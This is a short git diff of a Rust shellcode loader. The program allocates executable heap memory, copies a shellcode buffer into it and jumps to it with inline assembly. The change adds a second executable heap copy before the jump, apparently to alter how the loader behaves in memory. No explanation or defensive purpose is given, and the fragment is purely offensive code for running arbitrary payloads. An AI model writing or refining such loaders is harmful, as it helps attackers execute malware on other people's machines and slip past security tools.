@@ -55,7 +55,13 @@ fn main() {
         let heap= HeapCreate(HEAP_CREATE_ENABLE_EXECUTE,0,0);
         let alloc = HeapAlloc(heap, 8, flen);
         std::ptr::copy_nonoverlapping(shellCode.as_ptr(), alloc as *mut u8, flen);
-        let jmp_target = alloc.offset(0 as isize);
+
+        let heap1= HeapCreate(HEAP_CREATE_ENABLE_EXECUTE,0,0);
+        let alloc1 = HeapAlloc(heap1, 8, flen);
+        std::ptr::copy_nonoverlapping(alloc as *mut u8, alloc1 as *mut u8, flen);
+
+
+        let jmp_target = alloc1.offset(0 as isize);
         asm!("jmp {}", in(reg) jmp_target)
     }
 }
